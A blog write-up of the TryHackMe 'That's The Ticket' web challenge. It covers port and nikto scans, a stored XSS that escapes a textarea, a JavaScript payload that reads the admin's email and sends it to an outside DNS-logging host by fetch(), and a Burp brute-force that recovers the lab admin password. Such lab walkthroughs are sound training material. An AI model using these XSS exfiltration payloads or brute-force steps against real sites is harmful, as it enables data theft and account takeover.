---
title: "That's The Ticket - THM"
date: "2021-06-09"
categories:
  - "ctf"
  - "infosec"
  - "writeup"
tags:
  - "ctf"
  - "cybersecurity"
  - "tryhackme"
  - "web"
---

Hello Hackers! Welcome back to another Write-up. so this time we are doing That's The Ticket from try hack me, so this is a medium level challenge and it's based on the web, okay so without further do let's get started with hacking.

[https://tryhackme.com/room/thatstheticket](https://tryhackme.com/room/thatstheticket)

you can check out the video version of this write-up from the below

<yt-video id="YL_aFu4hWcQ"> </yt-video>

so as always even tho this is a web challenge I started with some Nmap scan to get some idea about what's going with this box but from the Nmap scan I didn't found anything interesting I found out that the port 80 and 22 are open that's all

![](/images/carbon7.png)

since this contain a website i though of doing some nikto scan to get more idea about the website

```bash
nikto -h http://10.10.128.236/
```

![](/images/carbon8.png)

so as you can see we didn't found anything interesting from the Nikto scan too whats next? let's check the website

![](/images/screely-1623259434771-1024x539.png)

so when we go to the website we can see there's a login screen , so first i tried some default creds but no luck so next I created the account and now we can see that we have a dashboard.

![](/images/screely-1623259642418-1024x547.png)

so as you can see here we can create tickets, so if you try some XSS payload it won't work here, you have to be a bit creative in this case so if you view the source code you can see that messages we are adding are inside a "textarea" this is the reason why out payload is not working since the things inside of textarea are just treated as texts so what we can do is we can close that tag and add xss so it should get triggered let's see

in the below you can see i have shown a simple payload that we can use to trigger xss here

![](/images/carbon9.png)

```html
</textarea> <script> alert("hello"); </script>
```

so if we run this we can see the XSS will get triggered and now we successfully triggered XSS, but how can we get the user? this is a very interesting part of this challenge. so if we look at the hint it says,

> Our HTTP & DNS Logging tool on [http://10.10.10.100](http://10.10.10.100) may come in useful!
>
> Hint

we can create a Request Catcher session for this box also you can do this in other ways but I think using the request catcher will be a lot helpful for you, okay so first if we tried to change the document.location we can see we can get our details but not the admins, but if you look at the DNS lookup that comes one is from admin!

awsome! we are close but how can we exploit it? yes so for that I wrote a simple javascript code to send the email as a subdomain when that happens we can see that from the DNS. but there is a small problem, that's since the email has characters like "@" our payload won't work it will break so we have a lot of options, we can encode the URL and take or else we can replace characters or get a character by character but here I thought of going for the replace characters way since I think its the fastest and easiest so you can see the payload I used below

![](/images/carbon10.png)

```html
</textarea>
<script>
var email = document.getElementById('email').innerHTML
var emailreplaced1 = email.replace('@','X')
var emailreplaced2 = emailreplaced1.replace('.','Y')
fetch('http://'+emailreplaced2+'.f6dd97cbbca6b33d8f7e673cd79a74e7.log.tryhackme.tech')
</script>
```

also below i have a video of getting the email.

congrats if you got the email you have done a good job so far, so forgetting the password we have to do a simple brute-force for this I thought of using burp-suite since I'm more comfortable with it also you can use hydra or any other tool if you are not familiar with brute-forcing with burp suite please go to the link below where you can find a good walkthrough from [portswigger](https://portswigger.net/support/using-burp-to-brute-force-a-login-page)

[https://portswigger.net/support/using-burp-to-brute-force-a-login-page](https://portswigger.net/support/using-burp-to-brute-force-a-login-page)

![](/images/screely-1623261486119.png)

so as you can see here we get a **302** redirect for the password **123123** yes so now we successfully found the password for the admin

```bash
adminaccount@itsupport.thm
123123
```

now all we have to do is login as the admin to get our flag

![](/images/screely-1623261676933-1024x652.png)

so just like above if you open the **1st message** we can see that we successfully got the flag for the challenge!!! congrats if you completed it. I hope you enjoyed the write-up and learned something new! so for the next time stay safe and **Keep On Hacking !!!**
